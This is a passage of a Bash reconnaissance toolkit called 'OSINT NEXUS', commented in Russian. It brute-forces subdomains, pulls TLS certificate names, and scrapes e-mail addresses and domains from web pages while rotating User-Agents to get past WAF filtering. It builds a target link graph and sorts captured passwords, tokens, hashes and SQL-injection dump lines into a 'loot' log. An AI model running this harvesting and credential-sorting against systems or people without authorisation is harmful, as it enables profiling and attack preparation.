                else if ($0 ~ hash_sha256) {
                    print "RESONANCE: CRYPTO HASH SHA-256 -> " $0 >> "/dev/stderr";
                    matched = 1;
                }
                else if ($0 ~ hash_sha1) {
                    print "RESONANCE: CRYPTO HASH SHA-1 -> " $0 >> "/dev/stderr";
                    matched = 1;
                }
                else if ($0 ~ hash_md5) {
                    print "RESONANCE: CRYPTO HASH MD5 -> " $0 >> "/dev/stderr";
                    matched = 1;
                }
                
                # Глубокий контекстный и SQL-анализ (Слои 5 и 6 матрицы хешей)
                if (!matched && ($0 ~ hash_ctx)) {
                    print "RESONANCE: CONTEXTUAL PASSWORDS/TOKENS -> " $0 >> "/dev/stderr";
                    matched = 1;
                }
                if (!matched && ($0 ~ hash_sql)) {
                    print "RESONANCE: SQL INJECTION DATABASE DUMP -> " $0 >> "/dev/stderr";
                    matched = 1;
                }

                # Запись уникального и классифицированного потока в центральное хранилище
                print $0 >> m_loot;
            }
        ' "$stage_file" 2>&1 >/dev/null | while read -r line; do 
            core_engine_ui "y" "$line"
        done

        # 3. АТОМАРНАЯ ОЧИСТКА И РОТАЦИЯ (Защита дисковой подсистемы от переполнения)
        rm -f "$pool" "$stage_file"
        
        # Проверка лимита размера лога. При превышении 5000 строк — безопасный срез
        if [[ -f "$master_loot" ]]; then
            if (( $(wc -l < "$master_loot") > 5000 )); then
                core_engine_ui "w" "Log rotation triggered: master_intelligence.log exceeded 5000 lines. Truncating."
                # Сохраняем последние 500 строк для удержания контекста смежных модулей
                tail -n 500 "$master_loot" > "${master_loot}.tmp" 2>/dev/null
                mv "${master_loot}.tmp" "$master_loot" 2>/dev/null
            fi
        fi
        
        sleep 30
    done
}


# ==============================================================================
# @description: OSINT NEXUS v20.0 - SECURE DISPATCHER ENGINE
# МОДЕРНИЗАЦИЯ: Белый список функций, защита от инъекций, полный статус-код
# АРХИТЕКТУРА: Ghost-Speed Engine, Validation-Loop, Strict Call Context
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | DISPATCHER LIMIT
# ==============================================================================
suggest_action() {
    local func="$1"
    local data="$2"
    
    # 1. Слой безопасности (Whitelist Check)
    # Исполняем только функции, которые начинаются с 'osint_' — это наш доверенный API
    if [[ ! "$func" =~ ^osint_ ]]; then
        core_engine_ui "e" "Dispatcher-Engine: Security violation. Function '$func' is not in the whitelist."
        return 1
    fi

    # 2. Оптимизированный превью-слой (Интеллектуальное усечение)
    local preview
    if (( ${#data} > 30 )); then
        preview="${data:0:27}..."
    else
        preview="$data"
    fi
    
    # 3. Интерактивный контур
    echo -en "${B}>>> Intelligence suggestion | ACTION: ${W}$func${B} | DATA: ${Y}$preview${NC}\n"
    
    if core_engine_validator "read" "Confirm execution? [y/N]"; then
        # 4. Безопасное исполнение в защищенном subshell
        core_engine_ui "i" "Dispatcher-Engine: Invoking $func..."
        
        if "$func" "$data"; then
            core_engine_ui "s" "Dispatcher-Engine: Action $func completed successfully."
            return 0
        else
            core_engine_ui "e" "Dispatcher-Engine: Action $func failed with error code $?."
            return 1
        fi
    else
        core_engine_ui "i" "Dispatcher-Engine: Action bypassed by user. Data indexed."
        return 0
    fi
}


# ==============================================================================
# @description: OSINT NEXUS v20.0 - HIGH-VELOCITY API QUERY ENGINE
# МОДЕРНИЗАЦИЯ: Атомарная валидация, RAM-защита, обработка 429/403 сигнатур
# АРХИТЕКТУРА: Ghost-Speed Engine, сессионный файловый дескриптор, Zero-Leak Memory
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | API QUERY LIMIT
# ==============================================================================
osint_api_query() {
    local endpoint="$1"
    [[ -z "$endpoint" ]] && return 1

    # Защита памяти: работаем через временный файл, а не через переменную
    local tmp_response="/tmp/nexus_api_res_$$"
    
    # Случайный UA из пула
    local ua_count=${#GLOBAL_NETWORK_UA[@]}
    local selected_ua="${GLOBAL_NETWORK_UA[$((RANDOM % ua_count))]}"

    # Выполнение запроса с жесткими ограничениями
    local http_status
    http_status=$(curl -s -L --max-time 10 \
        --connect-timeout 5 \
        --max-filesize 2097152 \
        -w "%{http_code}" \
        -H "User-Agent: $selected_ua" \
        -H "Connection: close" \
        -o "$tmp_response" "$endpoint" 2>/dev/null)

    # Логика обработки ответов (Атомарная валидация)
    case "$http_status" in
        200)
            cat "$tmp_response"
            rm -f "$tmp_response"
            return 0
            ;;
        429)
            core_engine_ui "w" "API-Engine: Rate limit exceeded (429). Throttling required."
            rm -f "$tmp_response"
            return 1
            ;;
        *)
            core_engine_ui "e" "API-Engine: Request failed with status $http_status for $endpoint"
            rm -f "$tmp_response"
            return 1
            ;;
    esac
}


# ==============================================================================
# @description: OSINT NEXUS v21.0 - ULTIMATE ASYNCHRONOUS DNS RECON ENGINE
# МОДЕРНИЗАЦИЯ: Синхронизация с инфраструктурным реестром GLOBAL_INFRA_MATRIX
# АРХИТЕКТУРА: Скользящий динамический пул потоков, RAM-накопление, жесткий timeout
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | ABSOLUTE ARCHITECTURAL LIMIT
# ==============================================================================
osint_subdomain_recon() {
    local target_domain="$1"
    
    # Жесткий контроль контекста среды и наличия дескрипторов логирования
    [[ -z "$raw_log" || ! -f "$raw_log" ]] && return 1
    [[ -z "$target_domain" ]] && return 1

    # Извлечение строгого POSIX ERE паттерна доменных имен (Слой 3 инфраструктурной матрицы)
    local sys_domain_pattern="${GLOBAL_INFRA_MATRIX[2]}"

    # --- 1. СЛОЙ ИНТЕЛЛЕКТУАЛЬНОЙ ВАЛИДАЦИИ ЦЕЛИ ---
    local clean_domain
    clean_domain=$(echo "$target_domain" | sed -E 's|^https?://||; s|/.*||')

    # Проверка на соответствие регулярному выражению легитимных доменов (Индекс 2 матрицы)
    if ! echo "$clean_domain" | grep -Eq "$sys_domain_pattern"; then
        return 0 # Мгновенный возврат, если входная цель не является доменной структурой
    fi

    # Верификация системных бинарных зависимостей в PATH
    if ! command -v host >/dev/null 2>&1; then
        core_engine_ui "e" "DNS-Engine: Structural dependency 'host' is missing. Skipping recon."
        return 1
    fi

    core_engine_ui "i" "DNS-Engine: Checking Wildcard protection for $clean_domain..."

    # --- 2. СЛОЙ АППАРАТНОЙ ЗАЩИТЫ ОТ WILDCARD DNS ---
    # Генерируем уникальный несуществующий поддомен для эвристического теста
    local rand_sub="nexus-detect-$(shuf -i 100000-999999 -n 1)"
    if host "$rand_sub.$clean_domain" >/dev/null 2>&1; then
        core_engine_ui "w" "DNS-Engine: Wildcard DNS active on $clean_domain. Brute-force blocked to protect log integrity."
        return 0
    fi

    core_engine_ui "i" "DNS-Engine: Deploying sliding-window parallel brute-force [GHOST-SPEED]..."

    # Изолированный буфер сессии текущего PID
    local tmp_dns_results="/tmp/nexus_dns_raw_$$"
    touch "$tmp_dns_results"

    # --- 3. СЛОЙ СКОЛЬЗЯЩЕГО АСИНХРОННОГО ПУЛА (SLIDING WINDOW POOL) ---
    local max_jobs=20  # Оптимальный лимит параллельных сокетов для предотвращения дропа UDP-пакетов
    
    # Открываем атомарный неблокирующий дескриптор записи в RAM-буфер /tmp
    {
        for sub in "${GLOBAL_DNS_WORDLIST[@]}"; do
            [[ -z "$sub" ]] && continue
            
            # Асинхронный атомарный изолированный subshell
            (
                # Фиксируем таймаут утилиты (-W 1) и оборачиваем в core-timeout на случай зависания сокета
                local dns_out
                dns_out=$(timeout 2 host -W 1 "$sub.$clean_domain" 2>/dev/null)
                
                # Парсинг успешных ответов DNS-сервера (A и AAAA записи)
                if [[ "$dns_out" == *"has address"* || "$dns_out" == *"has IPv6 address"* ]]; then
                    local res_ip
                    res_ip=$(echo "$dns_out" | grep -E "has address|has IPv6 address" | awk '{print $NF}' | xargs)
                    if [[ -n "$res_ip" ]]; then
                        echo "   -> [SUBDOMAIN]: $sub.$clean_domain | RESOLVED_IP: [$res_ip]"
                    fi
                fi
            ) &

            # --- УЛЬТИМАТИВНЫЙ КОНТРОЛЛЕР СКОЛЬЗЯЩЕГО ОКНА ---
            # Вместо ожидания завершения всей пачки, удерживаем пул активным строго на 20 потоков.
            # Как только один процесс освобождает PID, цикл мгновенно подбрасывает следующий элемент wordlist.
            while (( $(jobs -p | wc -l) >= max_jobs )); do
                sleep 0.01  # Микропауза планировщика ядра Linux (0.01с снижает оверхед CPU до ~0%)
            done
        done
        wait # Ожидаем завершения финального остатка запущенных процессов в фоне
    } > "$tmp_dns_results"

    # --- 4. СЛОЙ АТОМАРНОЙ ФИКСАЦИИ В МОНОЛИТЕ LOG-ФАЙЛА ---
    if [[ -s "$tmp_dns_results" ]]; then
        local total_found
        total_found=$(wc -l < "$tmp_dns_results")

        {
            echo -e "\n"
            echo "=============================================================================="
            echo " @CORE_DNS_RECON_REPORT | TARGET: $clean_domain | ACTIVE NODES: $total_found"
            echo "=============================================================================="
            # Стриминговая дедупликация и фиксация алфавитной структуры
            cat "$tmp_dns_results" | sort -u
            echo "=============================================================================="
        } >> "$raw_log"
        
        core_engine_ui "s" "DNS-Engine: Successfully mapped $total_found unique infrastructure subdomains."
    else
        core_engine_ui "i" "DNS-Engine: Scan complete. No hidden subdomains exposed via core wordlist."
    fi

    # Тотальная санитарная зачистка следов сессии процесса из директории /tmp
    rm -f "$tmp_dns_results"
}


# ==============================================================================
# @description: OSINT NEXUS v21.0 - HIGH-SPEED TLS FINGERPRINT PROCESSOR
# МОДЕРНИЗАЦИЯ: Интеграция с IPv4/IPv6 контурами GLOBAL_INFRA_MATRIX v1.0
# АРХИТЕКТУРА: Ghost-Speed Engine, RAM-пайплайн, оптимизированный SAN-декодер
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | TLS ANALYZER LIMIT
# ==============================================================================
osint_ssl_fingerprint() {
    local target="$1"
    
    # Жесткий контроль контекста среды и наличия дескрипторов логирования
    [[ -z "$raw_log" || ! -f "$raw_log" ]] && return 1
    [[ -z "$target" ]] && return 1

    # Загрузка регулярных выражений сетевого уровня из единого инфраструктурного реестра
    local pattern_ipv4="${GLOBAL_INFRA_MATRIX[0]}"
    local pattern_ipv6="${GLOBAL_INFRA_MATRIX[1]}"
    
    # --- 1. СЛОЙ ИНТЕЛЛЕКТУАЛЬНОЙ СЕПАРАЦИИ И ЗАЩИТЫ SNI ---
    local sni_cmd=""
    local clean_host="$target"

    # Тотальная зачистка входных данных от случайных префиксов веб-протоколов
    clean_host=$(echo "$target" | sed -E 's|^https?://||; s|/.*||')

    # Проверяем цель по контурам IPv4 и IPv6 матриц
    if echo "$clean_host" | grep -Eq "$pattern_ipv4" || echo "$clean_host" | grep -Eq "$pattern_ipv6"; then
        # Если цель IP-адрес — TLS SNI (-servername) принудительно отключается, 
        # чтобы предотвратить блокировки handshaking со стороны строгих веб-серверов
        sni_cmd=""
    else
        # Если цель является классическим или IDN доменом — активируем расширение SNI
        sni_cmd="-servername $clean_host"
    fi

    core_engine_ui "i" "TLS-Scanner: Extracting cryptographic certificates from $clean_host..."

    # Изолированный временный буфер сессии текущего PID (RAM-накопление)
    local tmp_ssl="/tmp/nexus_ssl_raw_$$"
    local tmp_parsed="/tmp/nexus_ssl_parsed_$$"
    touch "$tmp_ssl" "$tmp_parsed"

    # --- 2. СЛОЙ ВЫСОКОСКОРОСТНОГО ИЗОЛИРОВАННОГО СБОРА (CENSYS MODE) ---
    # -connect_timeout 4 и -timeout 4 — двухбарьерный рубеж защиты от зависания сетевых сокетов
    # Передача пустого ввода через Here-string <<< "" для мгновенного закрытия сессии после обмена ключами
    <<< "" openssl s_client $sni_cmd -connect "$clean_host:443" -connect_timeout 4 -timeout 4 2>/dev/null > "$tmp_ssl"

    # Верификация факта захвата сырого тела SSL/TLS сертификата
    if ! grep -q "BEGIN CERTIFICATE" "$tmp_ssl" 2>/dev/null; then
        core_engine_ui "i" "TLS-Scanner: Port 443 closed, non-TLS protocol or handshake refused on $clean_host."
        rm -f "$tmp_ssl" "$tmp_parsed"
        return 0
    fi

    # --- 3. СЛОЙ ГЛУБОКОГО СИГНАТУРНОГО ПАРСИНГА В RAM ---
    {
        echo "[+] SSL/TLS CERTIFICATE METADATA:"
        
        # Экстракция субъекта (Subject) и издателя (Issuer) с форматированием отступов
        openssl x509 -in "$tmp_ssl" -noout -subject -issuer 2>/dev/null | sed 's/^/   /'
        
        # Экстракция временных меток жизненного цикла сертификата (Not Before / Not After)
        openssl x509 -in "$tmp_ssl" -noout -dates 2>/dev/null | sed 's/^/   /'
        
        # Вычисление уникального серийного номера и SHA-256 крипто-отпечатка (Shodan/Censys Hash)
        local serial
        local fingerprint
        serial=$(openssl x509 -in "$tmp_ssl" -noout -serial 2>/dev/null | cut -d= -f2)
        fingerprint=$(openssl x509 -in "$tmp_ssl" -noout -fingerprint -sha256 2>/dev/null | cut -d= -f2)
        echo "   serialNumber=$serial"
        echo "   sha256Fingerprint=$fingerprint"

        # КРИТИЧЕСКИЙ OSINT-ВЕКТОР: Потоковый сбор матрицы альтернативных доменов (SAN)
        # Оптимизированный однопроходный sed извлекает все связанные субдомены инфраструктуры цели
        local san_domains
        san_domains=$(openssl x509 -in "$tmp_ssl" -noout -text 2>/dev/null | \
            sed -n '/Subject Alternative Name/{n;p;}' | \
            sed 's/DNS://g; s/,//g' | xargs)
        
        if [[ -n "$san_domains" ]]; then
            echo "[+] EXTRACTED ALTERNATIVE DOMAIN MATRIX (SAN):"
            for domain in $san_domains; do
                echo "   -> Alternative Node: $domain"
            done
        fi
    } > "$tmp_parsed"

    # --- 4. СЛОЙ АТОМАРНОЙ ФИКСАЦИИ В МОНОЛИТЕ LOG-ФАЙЛА ---
    if [[ -s "$tmp_parsed" ]]; then
        {
            echo -e "\n"
            echo "=============================================================================="
            echo " @CORE_TLS_FINGERPRINT_REPORT | HOST: $clean_host"
            echo "=============================================================================="
            cat "$tmp_parsed"
            echo "=============================================================================="
        } >> "$raw_log"
        
        core_engine_ui "s" "TLS-Scanner: Deep certificate telemetry injected into log successfully."
    fi

    # Тотальная санитарная зачистка следов сессии процесса из директории /tmp
    rm -f "$tmp_ssl" "$tmp_parsed"
}

# ==============================================================================
# @description: OSINT NEXUS v21.0 - HIGH-VELOCITY LINK CORRELATION ENGINE
# МОДЕРНИЗАЦИЯ: Интеграция с GLOBAL_INFRA_MATRIX v1.0 и GLOBAL_EMAIL_MATRIX v1.0
# АРХИТЕКТУРА: Ghost-Speed Engine, RAM-процессор графов, каскадный многоцелевой парсер
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | MATRIX CORRELATION LIMIT
# ==============================================================================
osint_link_correlator() {
    # Полная синхронизация с глобальной экосистемой путей
    local target_loot="${PRIME_LOOT:-$HOME/prime_loot}"
    
    # Жесткий контроль контекста среды и прав доступа к дескрипторам
    [[ -z "$raw_log" || ! -f "$raw_log" || ! -r "$raw_log" ]] && return 1
    [[ ! -d "$target_loot" ]] && mkdir -p "$target_loot"

    core_engine_ui "i" "Correlator: Extracting infrastructure links and building Maltego-matrix..."

    # Синхронизация ультимативных регулярных выражений ядра из монолитных матриц
    local rx_email_std="${GLOBAL_EMAIL_MATRIX[0]}"
    local rx_email_idn="${GLOBAL_EMAIL_MATRIX[1]}"
    local rx_ipv4="${GLOBAL_INFRA_MATRIX[0]}"
    local rx_ipv6="${GLOBAL_INFRA_MATRIX[1]}"
    local rx_domain="${GLOBAL_INFRA_MATRIX[2]}"

    # Целевой файл топологии направленного графа
    local graph_output="$target_loot/graph_links.txt"
    
    # Изолированный временный буфер для обработки текущей сессии PID
    local tmp_graph="/tmp/nexus_graph_$$"
    touch "$tmp_graph"

    # --- СЛОЙ ВЫСОКОСКОРОСТНОЙ АССОЦИАТИВНОЙ КОРРЕЛЯЦИИ (ПРОЦЕССОР AWK) ---
    # Пропускаем лог через высокопроизводительный RAM-процессор.
    # Выделение сущностей происходит атомарно в рамках одной строки без дискового оверхеда.
    awk -v rx_em_std="$rx_email_std" \
        -v rx_em_idn="$rx_email_idn" \
        -v rx_v4="$rx_ipv4" \
        -v rx_v6="$rx_ipv6" \
        -v rx_dom="$rx_domain" \
        '
        {
            # Инициализация и обнуление регистров захвата сущностей для текущей строки лога
            email = ""; ip = ""; domain = "";
            
            # 1. Форензик-анализ: Каскадная экстракция Email (Сначала IDN/Punycode, затем стандарт)
            if (match($0, rx_em_idn)) {
                email = substr($0, RSTART, RLENGTH);
            } else if (match($0, rx_em_std)) {
                email = substr($0, RSTART, RLENGTH);
            }
            
            if (email != "") {
                # Санитарная очистка артефактов и концевых символов
                gsub(/[^a-zA-Z0-9._%+-@]/, "", email);
            }
            
            # 2. Форензик-анализ: Экстракция IP-адресов (Сначала приоритетный стек IPv6, затем IPv4)
            if (match($0, rx_v6)) {
                ip = substr($0, RSTART, RLENGTH);
            } else if (match($0, rx_v4)) {
                ip = substr($0, RSTART, RLENGTH);
            }
            
            # 3. Форензик-анализ: Экстракция Доменов / Поддоменов
            if (match(tolower($0), tolower(rx_dom))) {
                domain = substr($0, RSTART, RLENGTH);
                # Строгий барьер: исключаем случайное попадание чистых IPv4 адресов в секцию доменов
                if (domain ~ /^[0-9.]+$/) {
                    domain = "";
                }
            }

            # --- СЛОЙ ПОСТРОЕНИЯ РЕБЕР НАПРАВЛЕННОГО ГРАФА (EDGE GENERATION) ---
            # Связь тип 1: Выявлена устойчивая пара [Email -> Domain] в едином контексте строки
            if (email != "" && domain != "" && email != domain) {
                links[email " -> " domain]++;
            }
            
            # Связь тип 2: Выявлена устойчивая пара [Email -> IP] (Хост авторизации или атаки)
            if (email != "" && ip != "") {
                links[email " -> " ip]++;
            }
            
            # Связь тип 3: Выявлена устойчивая пара [Domain -> IP] (Инфраструктурный резолвинг)
            if (domain != "" && ip != "") {
                links[domain " -> " ip]++;
            }
        }
        END {
            # Выгрузка построенной ассоциативной RAM-матрицы с подсчетом веса ребер (hits)
            for (edge in links) {
                print "[GRAPH_EDGE] (" links[edge] " hits) | " edge;
            }
        }
    ' "$raw_log" > "$tmp_graph"

    # --- СЛОЙ ФИКСАЦИИ, СОРТИРОВКИ И ИНТЕГРАЦИИ РЕЗУЛЬТАТОВ ---
    if [[ -s "$tmp_graph" ]]; then
        # Высокоскоростная числовая сортировка графа по весу связей (ключ -k2 указывает на количество hits)
        sort -rn -k2 "$tmp_graph" > "$graph_output" 2>/dev/null
        
        # Дублируем сводку корреляции в конец основного форензик-лога для сохранения целостности досье цели
        {
            echo -e "\n"
            echo "=============================================================================="
            echo " @CORE_LINK_CORRELATION_MATRIX | TOTAL UNIQUE EDGES EXTRACTED"
            echo "=============================================================================="
            cat "$graph_output"
            echo "=============================================================================="
        } >> "$raw_log"

        local total_edges
        total_edges=$(wc -l < "$graph_output")
        core_engine_ui "s" "Correlator: Successfully mapped $total_edges unique infrastructure graph links to graph_links.txt."
    else
        echo "[i] No multi-vector cross-links identified in this log session." > "$graph_output"
        core_engine_ui "i" "Correlator: Analytical baseline is clear. No infrastructure cross-links found."
    fi

    # Тотальная санитарная зачистка следов процесса из директории /tmp (Безопасность I/O)
    rm -f "$tmp_graph"
}


# ==============================================================================
# @description: OSINT NEXUS v21.0 - RAW MULTI-VECTOR HARVEST ENGINE
# МОДЕРНИЗАЦИЯ: Интеграция с контурами GLOBAL_INFRA_MATRIX и GLOBAL_EMAIL_MATRIX
# АРХИТЕКТУРА: Ghost-Speed Engine, потоковый RAM-пайплайн, защита от памяти OOM
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | HARVEST LIMIT
# ==============================================================================
osint_harvest_data() {
    local target_url="$1"
    
    # Жесткий контроль контекста: лог-файл и целевой URL обязаны быть инициализированы
    [[ -z "$raw_log" || ! -f "$raw_log" ]] && return 1
    [[ -z "$target_url" ]] && return 1

    core_engine_ui "i" "Harvester: Initiating high-velocity data extraction vector..."

    # --- 0. СИНХРОНИЗАЦИЯ УЛЬТИМАТИВНЫХ МАТРИЦ ЯДРА ---
    # Извлекаем регулярные выражения строго из индексов монолитных системных массивов
    local rx_email_std="${GLOBAL_EMAIL_MATRIX[0]}"
    local rx_email_idn="${GLOBAL_EMAIL_MATRIX[1]}"
    local rx_email_loc="${GLOBAL_EMAIL_MATRIX[2]}"
    local rx_domain_std="${GLOBAL_INFRA_MATRIX[2]}"
    local rx_domain_idn="${GLOBAL_INFRA_MATRIX[3]}"

    # Безопасный выбор случайного User-Agent для обхода базовых систем фильтрации (WAF)
    local selected_ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    if [[ -n "${GLOBAL_NETWORK_UA[*]}" ]]; then
        selected_ua=$(shuf -n1 -e "${GLOBAL_NETWORK_UA[@]}")
    fi

    # Изолированные временные сессионные буферы текущего PID процесса
    local tmp_html="/tmp/nexus_harvest_raw_$$"
    local tmp_extracted="/tmp/nexus_extracted_$$"
    touch "$tmp_html" "$tmp_extracted"

    # --- 1. СЛОЙ ОПТИМИЗИРОВАННОГО СЕТЕВОГО I/O ---
    # --max-filesize 5M (5242880 байт) - жесткая защита от зависания на гигантских бинарных файлах
    # --connect-timeout 5 и --max-time 15 - двухбарьерный рубеж защиты от удержания сокета сервером
    local http_code
    http_code=$(curl -s -L -A "$selected_ua" \
        --connect-timeout 5 \
        --max-time 15 \
        --max-filesize 5242880 \
        -o "$tmp_html" \
        -w "%{http_code}" "$target_url" 2>/dev/null)

    # Контроль валидности сетевой сессии и факта заполнения дискового буфера
    if [[ "$http_code" != "200" || ! -s "$tmp_html" ]]; then
        core_engine_ui "w" "Harvester: Target returned non-200 code ($http_code) or empty buffer. Aborting."
        rm -f "$tmp_html" "$tmp_extracted"
        return 0
    fi

    # --- 2. СЛОЙ ВЫСОКОСКОРОСТНОГО ИЗВЛЕЧЕНИЯ И RAM-ДЕДУПЛИКАЦИИ ---
    # Читаем скачанный HTML-буфер ровно ОДИН раз, исключая множественные дисковые операции чтением grep
    {
        # Вектор А: Каскадная экстракция и мгновенная дедупликация почтовых адресов (Standard / IDN / Local)
        local emails
        emails=$(grep -Eoi "$rx_email_std|$rx_email_idn|$rx_email_loc" "$tmp_html" 2>/dev/null | awk '!visited[tolower($0)]++')
        if [[ -n "$emails" ]]; then
            echo "[+] EXTRACTED IDENTITIES (EMAILS):"
            echo "$emails" | sed 's/^/   -> /'
            echo ""
        fi

        # Вектор Б: Каскадная экстракция и мгновенная дедупликация доменных имен (Standard / Punycode)
        local domains
        domains=$(grep -Eoi "$rx_domain_std|$rx_domain_idn" "$tmp_html" 2>/dev/null | awk '!visited[tolower($0)]++')
        if [[ -n "$domains" ]]; then
            echo "[+] EXTRACTED INFRASTRUCTURE NODES (DOMAINS):"
            echo "$domains" | sed 's/^/   -> /'
            echo ""
        fi
    } > "$tmp_extracted"

    # Мгновенно освобождаем дисковое пространство от сырого HTML-файла
    rm -f "$tmp_html"

    # --- 3. СЛОЙ АТОМАРНОЙ ФИКСАЦИИ РЕЗУЛЬТАТОВ В МОНОЛИТЕ LOG-ФАЙЛА ---
    if [[ -s "$tmp_extracted" ]]; then
        local total_emails=0
        local total_domains=0
        
        # Подсчет метрик для вывода в интерфейс оператора
        [[ -n "$emails" ]] && total_emails=$(echo "$emails" | wc -l)
        [[ -n "$domains" ]] && total_domains=$(echo "$domains" | wc -l)
        local total_entities=$((total_emails + total_domains))

        {
            echo -e "\n"
            echo "=============================================================================="
            echo " @CORE_HARVEST_DATA_REPORT | SOURCE: $target_url"
            echo "=============================================================================="
            cat "$tmp_extracted"
            echo "=============================================================================="
        } >> "$raw_log"
        
        core_engine_ui "s" "Harvester: Extraction completed. Captured $total_entities unique entities (Emails: $total_emails, Domains: $total_domains)."
    else
        core_engine_ui "i" "Harvester: Active scanning finished. No identities or entities found."
    fi

    # Финальная санитарная зачистка следов сессии процесса из директории /tmp
    rm -f "$tmp_extracted"
}

# ==============================================================================
# @description: OSINT NEXUS v21.0 - HIGH-SPEED NETWORK TRACE ENGINE
# МОДЕРНИЗАЦИЯ: Интеграция с многослойным сетевым контуром GLOBAL_INFRA_MATRIX
# АРХИТЕКТУРА: Ghost-Speed Engine, трехэшелонный фолбэк (MTR/Traceroute/Ping)
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | NETWORK TRACE LIMIT
# ==============================================================================
osint_network_trace() {
    local target="$1"
    
    # Защита контекста: лог-файл и цель обязаны быть инициализированы
    [[ -z "$raw_log" || ! -f "$raw_log" ]] && return 1
    [[ -z "$target" ]] && return 1

    # Синхронизация регулярных выражений сетевого уровня из монолитного реестра инфраструктуры
    local pattern_ipv4="${GLOBAL_INFRA_MATRIX[0]}"
    local pattern_ipv6="${GLOBAL_INFRA_MATRIX[1]}"
    local pattern_domain="${GLOBAL_INFRA_MATRIX[2]}"

    # Тотальная зачистка входных данных от случайных префиксов веб-протоколов
    local clean_host
    clean_host=$(echo "$target" | sed -E 's|^https?://||; s|/.*||')

    # --- СЛОЙ ИНТЕЛЛЕКТУАЛЬНОЙ СЕПАРАЦИИ ЦЕЛИ (Защита от мусорного I/O) ---
    # Трассировка имеет технический смысл только для сетевых хостов (IPv4, IPv6 или Доменов)
    if ! echo "$clean_host" | grep -Eq "$pattern_ipv4" && \
       ! echo "$clean_host" | grep -Eq "$pattern_ipv6" && \
       ! echo "$clean_host" | grep -Eq "$pattern_domain"; then
        return 0 # Молча выходим, если цель является никнеймом, email-адресом или хэшем
    fi

    core_engine_ui "i" "Network-Trace: Mapping network path to target [GHOST-SPEED]..."

    # Изолированный буфер сессии текущего PID процесса для захвата вывода трассировки
    local tmp_trace="/tmp/nexus_trace_$$"
    touch "$tmp_trace"

    # --- СЛОЙ ВЫСОКОСКОРОСТНОЙ АДАПТИВНОЙ ТРАССИРОВКИ (ТРЕХЭШЕЛОННЫЙ ФОЛБЭК) ---
    # 1. ЭШЕЛОН А: Если в системе доступна утилита MTR (Максимально информативный режим)
    if command -v mtr >/dev/null 2>&1; then
        # -r  - режим генерации отчета (report)
        # -w  - вывод полных имен без усечения широких строк
        # -n  - ПРИНУДИТЕЛЬНОЕ ОТКЛЮЧЕНИЕ REVERSE DNS (Ускорение в 10 раз, полная защита от сетевых зависаний)
        # -c 2 - два проверочных цикла для экспресс-оценки потерь пакетов на узлах маршрута
        mtr -rwn -c 2 "$clean_host" > "$tmp_trace" 2>/dev/null
        
    # 2. ЭШЕЛОН Б: Фолбэк на классический traceroute с жесткой оптимизацией таймаутов сокетов
    elif command -v traceroute >/dev/null 2>&1; then
        # -n  - ПРИНУДИТЕЛЬНОЕ ОТКЛЮЧЕНИЕ REVERSE DNS
        # -m 12 - ограничение максимального количества хопов (достаточно для детекта CDN и пограничного шлюза)
        # -w 1  - таймаут ожидания ответа от транзитного узла строго 1 секунда (вместо дефолтных 5 секунд)
        # -q 1  - отправка строго 1 запроса на хоп вместо 3 (ускорение прохождения фазы в 3 раза)
        traceroute -n -m 12 -w 1 -q 1 "$clean_host" > "$tmp_trace" 2>/dev/null
        
    # 3. ЭШЕЛОН В: Аварийный фолбэк на ping с ограничением TTL для минималистичных систем
    elif command -v ping >/dev/null 2>&1; then
        echo "   [!] WARNING: 'mtr' and 'traceroute' are missing. Deploying emergency TTL-ping fallback..." > "$tmp_trace"
        # -c 3 - три контрольных пакета
        # -t 12 - ограничение времени жизни пакета (TTL/Max Hops) для базовой проверки доступности
        ping -c 3 -t 12 "$clean_host" >> "$tmp_trace" 2>/dev/null
    else
        echo "   [!] CRITICAL: 'mtr', 'traceroute' and 'ping' are missing in this environment. Telemetry unavailable." > "$tmp_trace"
    fi

    # --- СЛОЙ АТОМАРНОЙ ФИКСАЦИИ И СТРУКТУРИРОВАНИЯ В МОНОЛИТЕ ---
    if [[ -s "$tmp_trace" ]]; then
        {
            echo -e "\n"
            echo "=============================================================================="
            echo " @CORE_NETWORK_TRACE_REPORT | TARGET: $clean_host | TIMESTAMP: $(date '+%Y-%m-%d %H:%M:%S')"
            echo "=============================================================================="
            cat "$tmp_trace"
            echo "=============================================================================="
        } >> "$raw_log"
        
        core_engine_ui "s" "Network-Trace: Telemetry successfully appended to forensic log."
    fi

    # Санитарная очистка временных файлов текущего PID процесса (Безопасность I/O подсистемы)
    rm -f "$tmp_trace"
}


# ==============================================================================
# @description: OSINT NEXUS v20.0 - HIGH-VELOCITY RECON DELTA ENGINE
# МОДЕРНИЗАЦИЯ: Атомарная изоляция дифференциальных потоков, кастомный парсинг дельт
# АРХИТЕКТУРА: Ghost-Speed Engine, RAM-буферизация изменений, защита от мусорного I/O
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | OPERATIONAL LIMIT
# ==============================================================================
core_engine_compare_history() {
    # Полная привязка к твоей глобальной экосистеме путей
    local target_loot="${PRIME_LOOT:-$HOME/prime_loot}"

    # Жесткая проверка контекста: текущий лог должен быть инициализирован и физически существовать
    [[ -z "$raw_log" || ! -f "$raw_log" || ! -r "$raw_log" ]] && return 1

    core_engine_ui "i" "Delta-Engine: Scanning historical baselines for infrastructure changes..."

    # Находим последний исторический лог (второй по новизне в директории)
    local last_log
    last_log=$(ls -t "$target_loot"/forensic_* 2>/dev/null | sed -n '2p')

    # Если исторический базис не найден или недоступен на чтение — тихо выходим
    [[ -z "$last_log" || ! -f "$last_log" || ! -r "$last_log" ]] && return 0

    # Создаем изолированный сессионный буфер для предотвращения загрязнения I/O
    local tmp_delta="/tmp/nexus_delta_$$"
    touch "$tmp_delta"

    # --- СЛОЙ ВЫСОКОСКОРОСТНОГО ДИФФЕРЕНЦИАЛЬНОГО АНАЛИЗА ---
    # --normal - отключает тяжелые алгоритмы контекста (нам нужна только чистая скорость)
    # Используем awk для красивого форматирования вывода на лету
    diff --normal "$last_log" "$raw_log" 2>/dev/null | awk '
        /^>/ { sub(/^>.?/, ""); print "   [+] NEW_MARKER: " $0; next }
        /^</ { sub(/^<.?/, ""); print "   [-] REMOVED_MARKER: " $0; next }
